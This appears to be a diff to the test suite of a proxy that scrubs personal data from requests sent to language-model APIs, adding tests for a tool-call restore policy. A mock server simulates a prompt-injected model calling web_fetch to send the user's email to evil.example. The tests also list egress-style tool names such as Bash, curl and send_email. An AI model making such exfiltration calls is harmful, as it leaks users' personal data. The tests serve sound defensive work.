@@ -9,8 +9,13 @@ KNOWN = [("Jane Q Doe", "PERSON"), ("Jane", "PERSON"), ("jdoe@corp.example", "EM
 
 @pytest.fixture
 def sc(tmp_path):
-    cfg = dict(s.DEFAULTS, mode="on", state_dir=str(tmp_path / "st"))
+    cfg = dict(s.DEFAULTS, mode="on", state_dir=str(tmp_path / "st"), system_note="")   # note: see scn
     return s.Scrubber(cfg, known=KNOWN)
+
+
+@pytest.fixture
+def scn(tmp_path):                                  # with the default system note
+    return s.Scrubber(dict(s.DEFAULTS, mode="on", state_dir=str(tmp_path / "stn")), known=KNOWN)
 
 
 TEXT = ("Hi Jane Q Doe (jdoe@corp.example), call 425-555-0182 or +44 20 7946 0958. Card 4111 1111 1111 1111, not "
@@ -71,7 +76,7 @@ def test_unknown_placeholder_left_alone(sc):
 def test_tool_args_json_escaped(sc):
     sc.placeholder('Ann "AJ" O\'Neil', "PERSON")
     args = json.dumps({"to": "\u00abPERSON_1\u00bb", "body": "hello"})
-    out = sc.restore_obj({"tool_calls": [{"function": {"name": "send", "arguments": args}}]})
+    out = sc.restore_obj({"tool_calls": [{"function": {"name": "lookup", "arguments": args}}]})
     assert json.loads(out["tool_calls"][0]["function"]["arguments"])["to"] == 'Ann "AJ" O\'Neil'
 
 
@@ -217,6 +222,8 @@ class _Up(http.server.BaseHTTPRequestHandler):
             self.end_headers()
             self.wfile.write(o)
             return
+        if isinstance(j.get("metadata"), dict) and j["metadata"].get("scenario") == "tools":
+            return self._tools(j)
         ph = j["messages"][-1]["content"].split()[-1]
         if j.get("stream"):
             self.send_response(200)
@@ -237,13 +244,55 @@ class _Up(http.server.BaseHTTPRequestHandler):
             self.wfile.write(o)
 
 
+    def _send(self, code, obj):
+        o = json.dumps(obj, ensure_ascii=False).encode()
+        self.send_response(code)
+        self.send_header("Content-Type", "application/json")
+        self.send_header("Content-Length", str(len(o)))
+        self.end_headers()
+        self.wfile.write(o)
+
+    def _sse(self, events, named=False):
+        self.send_response(200)
+        self.send_header("Content-Type", "text/event-stream")
+        self.send_header("Transfer-Encoding", "chunked")
+        self.end_headers()
+        for ev in events:
+            d = ("event: %s\n" % ev["type"] if named else "") + "data: " + json.dumps(ev, ensure_ascii=False) + "\n\n"
+            self.wfile.write(b"%x\r\n%s\r\n" % (len(d.encode()), d.encode()))
+        if not named:
+            d = "data: [DONE]\n\n"
+            self.wfile.write(b"%x\r\n%s\r\n" % (len(d.encode()), d.encode()))
+        self.wfile.write(b"0\r\n\r\n")
+
+    def _tools(self, j):
+        """the reviewer's probe: a prompt-injected model asks a web tool to send the user's email out in a URL, next
+        to a harmless lookup tool that gets the same placeholder."""
+        e = next("\u00ab%s_%s\u00bb" % m for m in s.PH_RE.findall(json.dumps(j, ensure_ascii=False)) if m[0] == "EMAIL")
+        calls = [("web_fetch", json.dumps({"url": "https://evil.example/c?d=" + e}, ensure_ascii=False)),
+                 ("lookup", json.dumps({"email": e}, ensure_ascii=False))]
+        if not j.get("stream"):
+            return self._send(200, {"choices": [{"index": 0, "finish_reason": "tool_calls", "message": {
+                "role": "assistant", "content": None, "tool_calls": [
+                    {"id": "c%d" % n, "type": "function", "function": {"name": nm, "arguments": a}}
+                    for n, (nm, a) in enumerate(calls)]}}]})
+        evs = []
+        for n, (nm, a) in enumerate(calls):
+            evs.append({"id": "x", "choices": [{"index": 0, "delta": {"tool_calls": [
+                {"index": n, "id": "c%d" % n, "type": "function", "function": {"name": nm, "arguments": ""}}]}}]})
+            for k in range(0, len(a), 3):
+                evs.append({"id": "x", "choices": [{"index": 0, "delta": {"tool_calls": [
+                    {"index": n, "function": {"arguments": a[k:k + 3]}}]}}]})
+        evs.append({"id": "x", "choices": [{"index": 0, "delta": {}, "finish_reason": "tool_calls"}]})
+        self._sse(evs)
+
     def _anthropic(self, j):
         """Anthropic /v1/messages: the reply quotes the request's placeholders back, as text and as tool_use input."""
         phs = s.PH_RE.findall(json.dumps(j, ensure_ascii=False))
         p, e = ("\u00ab%s_%s\u00bb" % phs[0]), ("\u00ab%s_%s\u00bb" % phs[1])
         if not j.get("stream"):
             o = json.dumps({"id": "msg_1", "type": "message", "role": "assistant", "content": [
-                {"type": "text", "text": "Hi " + p}, {"type": "tool_use", "id": "tu_1", "name": "send_email",
+                {"type": "text", "text": "Hi " + p}, {"type": "tool_use", "id": "tu_1", "name": "save_contact",
                                                       "input": {"to": e, "name": p}}], "stop_reason": "tool_use"}).encode()
             self.send_response(200)
             self.send_header("Content-Type", "application/json")
@@ -277,7 +326,7 @@ def anthropic_fixture(p, e):
         {"type": "content_block_delta", "index": 0, "delta": {"type": "text_delta", "text": " you now " + p[:5]}},
         {"type": "content_block_delta", "index": 0, "delta": {"type": "text_delta", "text": p[5:]}},
         {"type": "content_block_stop", "index": 0},
-        {"type": "content_block_start", "index": 1, "content_block": {"type": "tool_use", "id": "tu_1", "name": "send_email",
+        {"type": "content_block_start", "index": 1, "content_block": {"type": "tool_use", "id": "tu_1", "name": "save_contact",
                                                                       "input": {}}},
         {"type": "content_block_delta", "index": 1, "delta": {"type": "input_json_delta", "partial_json": ""}},
         {"type": "content_block_delta", "index": 1, "delta": {"type": "input_json_delta", "partial_json": args[:cut]}},
@@ -402,16 +451,16 @@ def test_proxy_fail_closed_blocks(proxy):
     assert e.value.code == 503 and proxy.seen == []
 
 
-def test_system_note_appended_once(sc):
+def test_system_note_appended_once(scn):
     b = {"messages": [{"role": "system", "content": "You are a helpful assistant."}, {"role": "user", "content": "hi Jane Q Doe"}]}
-    sc.scrub_request(b)
-    sc.scrub_request(b)
+    scn.scrub_request(b)
+    scn.scrub_request(b)
     assert b["messages"][0]["content"].count("privacy stand-ins") == 1
 
 
 def test_egress_checks_skipped_keys(sc):
     with pytest.raises(s.ScrubError, match="egress"):
-        sc.scrub_request({"user": "Jane Q Doe", "messages": [{"role": "user", "content": "x"}]})
+        sc.scrub_request({"service_tier": "Jane Q Doe", "messages": [{"role": "user", "content": "x"}]})
 
 
 
@@ -634,7 +683,7 @@ def test_restore_exact_for_variant_forms_of_every_type(sc):
     for k in ("arguments",):                            # tool-call arguments come back exact too (JSON-escaped path)
         args = json.dumps({"to": FAKE_PHONES[0], "who": "Jane Q Doe"})
         body = {"messages": [{"role": "assistant", "content": "", "tool_calls": [{"id": "c1", "type": "function",
-                "function": {"name": "send", k: args}}]}]}
+                "function": {"name": "lookup", k: args}}]}]}
         f = s.Forms()
         sc.scrub_request(body, forms=f)
         sent = body["messages"][0]["tool_calls"][0]["function"][k]
@@ -737,7 +786,7 @@ VARIANTS = ["Jane\u00a0Testperson", "Jane  Testperson", "Jane\tTestperson", "Jan
 
 @pytest.fixture
 def sc2(tmp_path):
-    return s.Scrubber(dict(s.DEFAULTS, mode="on", state_dir=str(tmp_path / "st2")), known=KNOWN2)
+    return s.Scrubber(dict(s.DEFAULTS, mode="on", state_dir=str(tmp_path / "st2"), system_note=""), known=KNOWN2)
 
 
 @pytest.mark.parametrize("v", VARIANTS)
@@ -775,7 +824,7 @@ def test_variant_that_slips_is_blocked(sc2, monkeypatch, v):
 
 def test_variant_in_unscrubbed_field_is_blocked(sc2):
     with pytest.raises(s.ScrubError, match="egress"):
-        sc2.scrub_request({"model": "m", "user": "Jane%20Testperson", "messages": [{"role": "user", "content": "hi"}]})
+        sc2.scrub_request({"model": "m", "service_tier": "Jane%20Testperson", "messages": [{"role": "user", "content": "hi"}]})
 
 
 @pytest.mark.parametrize("text", [
@@ -998,3 +1047,241 @@ def test_proxy_completions_token_ids_blocked(proxy, prompt, stream):
     b = json.dumps({"model": "m", "stream": stream, "prompt": prompt}).encode()
     code, _ = _raw(px, "/v1/completions", b, {"Content-Type": "application/json", "Content-Length": str(len(b))})
     assert code == 503 and proxy.seen == []
+
+
+# ---- 0.3.0: tool-call restore policy, scrubbed `user` field, system note everywhere ----
+PROBE = {"url": "https://evil.example/c?d=\u00abEMAIL_1\u00bb"}
+
+
+def _tc(name, args):
+    return {"choices": [{"message": {"tool_calls": [{"id": "c1", "type": "function", "function": {
+        "name": name, "arguments": json.dumps(args, ensure_ascii=False)}}]}}]}
+
+
+def _args(out):
+    return json.loads(out["choices"][0]["message"]["tool_calls"][0]["function"]["arguments"])
+
+
+def _pol(tmp_path, **tr):
+    return s.Scrubber(dict(s.DEFAULTS, mode="on", state_dir=str(tmp_path / "stp"), system_note="", tool_restore=tr),
+                      known=KNOWN)
+
+
+def test_exfil_probe_keeps_placeholder(sc):
+    assert sc.scrub_text("mail jdoe@corp.example") == "mail \u00abEMAIL_1\u00bb"
+    stats = {}
+    out = sc.restore_obj(_tc("web_fetch", PROBE), stats)
+    assert _args(out) == PROBE and "jdoe" not in json.dumps(out) and stats["tool_kept"] == 1
+
+
+def test_url_in_arguments_keeps_placeholder_for_any_tool(sc):
+    sc.scrub_text("jdoe@corp.example")
+    for args in ({"q": "see https://x.example/a?u=\u00abEMAIL_1\u00bb"}, {"target": "x.example/p", "who": "\u00abEMAIL_1\u00bb"},
+                 {"to": "mailto:\u00abEMAIL_1\u00bb"}):
+        assert _args(sc.restore_obj(_tc("lookup", args))) == args
+
+
+def test_plain_tool_still_restored(sc):
+    sc.scrub_text("Jane Q Doe jdoe@corp.example")
+    stats = {}
+    out = sc.restore_obj(_tc("lookup", {"email": "\u00abEMAIL_1\u00bb", "path": "notes/jane.md"}), stats)
+    assert _args(out) == {"email": "jdoe@corp.example", "path": "notes/jane.md"} and "tool_kept" not in stats
+
+
+def test_allowlisted_tool_restored(tmp_path):
+    sc = _pol(tmp_path, allow=["web_fetch", "mcp__mail__*"])
+    sc.scrub_text("jdoe@corp.example")
+    assert _args(sc.restore_obj(_tc("web_fetch", PROBE))) == {"url": "https://evil.example/c?d=jdoe@corp.example"}
+    assert _args(sc.restore_obj(_tc("mcp__mail__send", {"to": "\u00abEMAIL_1\u00bb"}))) == {"to": "jdoe@corp.example"}
+
+
+def test_deny_and_default_keep(tmp_path):
+    sc = _pol(tmp_path, deny=["lookup"])
+    sc.scrub_text("jdoe@corp.example")
+    a = {"email": "\u00abEMAIL_1\u00bb"}
+    assert _args(sc.restore_obj(_tc("lookup", a))) == a
+    sc = _pol(tmp_path, default="keep", allow=["save_note"])
+    sc.scrub_text("jdoe@corp.example")
+    assert _args(sc.restore_obj(_tc("read_file", a))) == a
+    assert _args(sc.restore_obj(_tc("save_note", a))) == {"email": "jdoe@corp.example"}
+    sc = _pol(tmp_path, allow=["lookup"], deny=["lookup"])               # deny wins
+    assert _args(sc.restore_obj(_tc("lookup", a))) == a
+
+
+def test_tool_restore_false_restores_everything(tmp_path):
+    sc = s.Scrubber(dict(s.DEFAULTS, mode="on", state_dir=str(tmp_path / "stf"), tool_restore=False), known=KNOWN)
+    sc.scrub_text("jdoe@corp.example")
+    assert _args(sc.restore_obj(_tc("web_fetch", PROBE))) == {"url": "https://evil.example/c?d=jdoe@corp.example"}
+
+
+@pytest.mark.parametrize("name", ["web_fetch", "WebFetch", "WebSearch", "Bash", "exec", "exec_command", "local_shell",
+                                  "run_shell_command", "http_request", "curl", "send_email", "gmail_send", "git_push",
+                                  "browser_navigate", "mcp__fetch__fetch", "upload_file", "post", "message", "PowerShell",
+                                  "download_url", "slack_webhook"])
+def test_egress_names_keep(sc, name):
+    assert sc.tool_policy().by_name(name) == "keep"
+
+
+@pytest.mark.parametrize("name", ["read_file", "lookup", "create_note", "search_contacts", "prune_cache", "truncate",
+                                  "Edit", "apply_patch", "get_weather", "calendar_list", "sender_stats", "postal_code"])
+def test_other_names_depend_on_arguments(sc, name):
+    assert sc.tool_policy().by_name(name) is None
+
+
+def test_bad_tool_restore_config_fails_at_load(tmp_path):
+    p = tmp_path / "swapback.yaml"
+    p.write_text("tool_restore:\n  default: maybe\n")
+    with pytest.raises(ValueError, match="tool_restore"):
+        s.load_cfg(str(p))
+    p.write_text("tool_restore:\n  default: keep\n  allow: [lookup]\n")
+    assert s.ToolPolicy(s.load_cfg(str(p))["tool_restore"]).by_name("lookup") == "restore"
+
+
+def _chat_stream(sc, calls, step=1):
+    """calls: [(name, args_json)] streamed as OpenAI chunks, `step` chars per delta; returns (args per call, stats)."""
+    st = {"_forms": s.Forms()}
+    evs = []
+    for n, (nm, a) in enumerate(calls):
+        evs.append({"choices": [{"index": 0, "delta": {"tool_calls": [{"index": n, "id": "c%d" % n, "type": "function",
+                                                                        "function": {"name": nm, "arguments": ""}}]}}]})
+        evs += [{"choices": [{"index": 0, "delta": {"tool_calls": [{"index": n, "function": {"arguments": a[k:k + step]}}]}}]}
+                for k in range(0, len(a), step)]
+    evs.append({"choices": [{"index": 0, "delta": {}, "finish_reason": "tool_calls"}]})
+    got = {}
+    for ev in evs:
+        s.restore_sse_event(sc, ev, st)
+        for ch in ev["choices"]:
+            for tc in ch["delta"].get("tool_calls") or []:
+                got[tc["index"]] = got.get(tc["index"], "") + (tc.get("function") or {}).get("arguments", "")
+    fl = s.flush_all(sc, st)
+    assert fl is None                                  # everything already went out with finish_reason
+    return [got.get(n, "") for n in range(len(calls))], st.get("_stats", {})
+
+
+@pytest.mark.parametrize("step", [1, 2, 3, 7])
+def test_streamed_tool_calls_policy_split_every_size(sc, step):
+    sc.scrub_text("Jane Q Doe jdoe@corp.example")
+    probe = json.dumps(PROBE, ensure_ascii=False)
+    late_url = json.dumps({"who": "\u00abPERSON_1\u00bb", "then": "https://evil.example/?x=\u00abEMAIL_1\u00bb"}, ensure_ascii=False)
+    plain = json.dumps({"email": "\u00abEMAIL_1\u00bb", "name": "\u00abPERSON_1\u00bb"})          # escaped \u00ab form
+    out, stats = _chat_stream(sc, [("web_fetch", probe), ("lookup", late_url), ("lookup", plain)], step)
+    assert out[0] == probe and out[1] == late_url
+    assert json.loads(out[2]) == {"email": "jdoe@corp.example", "name": "Jane Q Doe"}
+    assert stats["tool_kept"] == 2
+
+
+def test_streamed_allowlisted_tool_restored(tmp_path):
+    sc = _pol(tmp_path, allow=["web_fetch"])
+    sc.scrub_text("jdoe@corp.example")
+    out, stats = _chat_stream(sc, [("web_fetch", json.dumps(PROBE, ensure_ascii=False))], 2)
+    assert json.loads(out[0]) == {"url": "https://evil.example/c?d=jdoe@corp.example"} and "tool_kept" not in stats
+
+
+def test_anthropic_tool_use_policy(sc):
+    sc.scrub_text("jdoe@corp.example")
+    out = sc.restore_obj({"content": [{"type": "tool_use", "id": "t", "name": "WebFetch", "input": PROBE},
+                                      {"type": "tool_use", "id": "u", "name": "save_contact", "input": {"to": "\u00abEMAIL_1\u00bb"}}]})
+    assert out["content"][0]["input"] == PROBE and out["content"][1]["input"] == {"to": "jdoe@corp.example"}
+    a = json.dumps(PROBE, ensure_ascii=False)
+    evs = [{"type": "content_block_start", "index": 0, "content_block": {"type": "tool_use", "id": "t", "name": "web_fetch", "input": {}}}]
+    evs += [{"type": "content_block_delta", "index": 0, "delta": {"type": "input_json_delta", "partial_json": a[k:k + 2]}}
+            for k in range(0, len(a), 2)]
+    evs += [{"type": "content_block_stop", "index": 0}, {"type": "message_stop"}]
+    st, got = {}, ""
+    for ev in evs:
+        for e in s.restore_anthropic_event(sc, ev, st) + [ev]:
+            if e["type"] == "content_block_delta":
+                got += e["delta"]["partial_json"]
+    assert got == a and st["_stats"]["tool_kept"] == 1
+
+
+def test_proxy_exfil_probe_kept_and_counted(proxy):
+    px, _, st = proxy
+    for stream in (False, True):
+        proxy.seen.clear()
+        code, out = _post(px, {"model": "m", "stream": stream, "metadata": {"scenario": "tools"},
+                               "messages": [{"role": "user", "content": "write to jdoe@corp.example"}]})
+        assert code == 200 and "jdoe" not in proxy.seen[0]
+        if stream:
+            args = {}
+            for l in out.splitlines():
+                if l.startswith("data: {"):
+                    for tc in json.loads(l[6:])["choices"][0]["delta"].get("tool_calls") or []:
+                        args[tc["index"]] = args.get(tc["index"], "") + tc["function"].get("arguments", "")
+            fetch, look = json.loads(args[0]), json.loads(args[1])
+        else:
+            tcs = json.loads(out)["choices"][0]["message"]["tool_calls"]
+            fetch, look = json.loads(tcs[0]["function"]["arguments"]), json.loads(tcs[1]["function"]["arguments"])
+        assert "jdoe" not in fetch["url"] and fetch["url"].startswith("https://evil.example/c?d=\u00abEMAIL_")
+        assert look == {"email": "jdoe@corp.example"}
+    log = [json.loads(x) for x in (st / "st" / "requests.jsonl").read_text().splitlines()]
+    assert [r["tool_kept"] for r in log[-2:]] == [1, 1]
+    assert "jdoe" not in (st / "st" / "requests.jsonl").read_text()
+
+
+def test_user_metadata_instructions_scrubbed(sc):
+    b = {"model": "m", "user": "jdoe@corp.example", "metadata": {"user_id": "Jane Q Doe"},
+         "instructions": "Answer Ozzie Pellam briefly.", "input": "hi", "safety_identifier": "jdoe@corp.example"}
+    sc.scrub_request(b)
+    assert "jdoe" not in json.dumps(b) and "Jane" not in json.dumps(b) and "Ozzie" not in json.dumps(b)
+    assert b["user"] == b["safety_identifier"] == "\u00abEMAIL_1\u00bb"
+
+
+NOTE = s.DEFAULTS["system_note"]
+
+
+def test_system_note_inserted_without_system_message(scn):
+    b = {"messages": [{"role": "user", "content": "hi Jane Q Doe"}]}
+    scn.scrub_request(b)
+    assert b["messages"][0] == {"role": "system", "content": NOTE} and len(b["messages"]) == 2
+    scn.scrub_request(b)
+    assert sum(NOTE in json.dumps(m, ensure_ascii=False) for m in b["messages"]) == 1
+    c = {"messages": [{"role": "user", "content": "hi there"}]}                 # nothing swapped: request untouched
+    scn.scrub_request(c)
+    assert c == {"messages": [{"role": "user", "content": "hi there"}]}
+
+
+def test_system_note_list_content_and_developer(scn):
+    b = {"messages": [{"role": "system", "content": [{"type": "text", "text": "Be brief."}]},
+                      {"role": "user", "content": "hi Jane Q Doe"}]}
+    scn.scrub_request(b)
+    scn.scrub_request(b)
+    assert b["messages"][0]["content"] == [{"type": "text", "text": "Be brief."}, {"type": "text", "text": NOTE}]
+    d = {"messages": [{"role": "developer", "content": "Be brief."}, {"role": "user", "content": "x"}]}
+    scn.scrub_request(d)
+    assert d["messages"][0]["content"] == "Be brief.\n\n" + NOTE
+
+
+def test_system_note_anthropic_system_field(scn):
+    b = {"model": "c", "max_tokens": 9, "system": "Be brief.", "messages": [{"role": "user", "content": "hi Jane Q Doe"}]}
+    scn.scrub_request(b, api="anthropic")
+    scn.scrub_request(b, api="anthropic")
+    assert b["system"] == "Be brief.\n\n" + NOTE and all(m["role"] != "system" for m in b["messages"])
+    blocks = [{"type": "text", "text": "Be brief.", "cache_control": {"type": "ephemeral"}}]
+    b = {"model": "c", "max_tokens": 9, "system": blocks, "messages": [{"role": "user", "content": "hi"}]}
+    scn.scrub_request(b, api="anthropic")
+    assert b["system"] == blocks + [{"type": "text", "text": NOTE}]
+    b = {"model": "c", "max_tokens": 9, "messages": [{"role": "user", "content": "hi Jane Q Doe"}]}
+    scn.scrub_request(b, api="anthropic")
+    assert b["system"] == NOTE and len(b["messages"]) == 1
+
+
+def test_system_note_responses_instructions(scn):
+    b = {"model": "m", "instructions": "Be brief.", "input": "hi Jane Q Doe"}
+    scn.scrub_request(b, api="responses")
+    assert b["instructions"] == "Be brief.\n\n" + NOTE
+    b = {"model": "m", "input": [{"role": "user", "content": "hi Jane Q Doe"}]}
+    scn.scrub_request(b, api="responses")
+    assert b["instructions"] == NOTE
+
+
+def test_proxy_anthropic_request_gets_system_note(proxy):
+    px, _, _ = proxy
+    proxy.seen.clear()
+    r = urllib.request.urlopen(urllib.request.Request(
+        "http://127.0.0.1:%d/v1/messages" % px, method="POST", headers={"Content-Type": "application/json"},
+        data=json.dumps({"model": "c", "max_tokens": 9, "system": [{"type": "text", "text": "Be brief."}],
+                         "messages": [{"role": "user", "content": "hi Jane Q Doe at jdoe@corp.example"}]}).encode()), timeout=10)
+    r.read()
+    sent = json.loads(proxy.seen[0])
+    assert sent["system"][-1] == {"type": "text", "text": NOTE} and all(m["role"] != "system" for m in sent["messages"])
